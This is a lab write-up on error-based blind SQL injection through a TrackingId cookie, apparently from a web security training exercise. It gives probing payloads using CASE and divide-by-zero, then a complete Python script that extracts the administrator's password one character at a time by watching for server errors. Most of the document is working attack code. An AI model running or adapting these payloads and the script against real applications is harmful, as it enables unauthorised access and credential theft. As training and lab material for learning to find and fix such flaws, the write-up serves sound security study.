In this lab `Tracking Id` cookie is  vulnerable to `SQL Injection`.

You can check this using the following statements sending them with the value of `tracking id`: 
```sql
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a   
```
These inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is true. With the first input, the CASE expression evaluates to 'a', which does not cause any error. With the second input, it evaluates to 1/0, which causes a divide-by-zero error. Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true.

We can systematically determine the password for the  given user `administrator` by sending a series of inputs to test the password one character at a time.
```sql
' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

You can use the following script to find the password:
```python
import sys
import requests
import string 
import time

if len(sys.argv) != 2:
    print(f"USAGE: {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

URL = sys.argv[1]

dic = string.ascii_letters+string.digits
response = requests.get(URL)
tracking_id = response.cookies["TrackingId"]
sess_cookie = response.cookies["session"]

def password(url):
    
    pwd = ""
    i = 1
    while(True):
        found_char = False
        print(f"Index : {i}")
        for d in dic:
            payload = tracking_id + "' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), "+str(i)+",1) = '"+d+"') THEN to_char(1/0) ELSE 'a' END FROM Dual)='a"
            response = requests.get(URL, headers={"Cookie":"TrackingId="+payload+"; session="+sess_cookie})
            if "Internal Server Error" in response.text:
                pwd += d
                print(pwd)
                found_char = True
                break
            time.sleep(1)
        i+=1
    
        if not found_char:
            print("Password : ",pwd)
            break

password(URL)
```
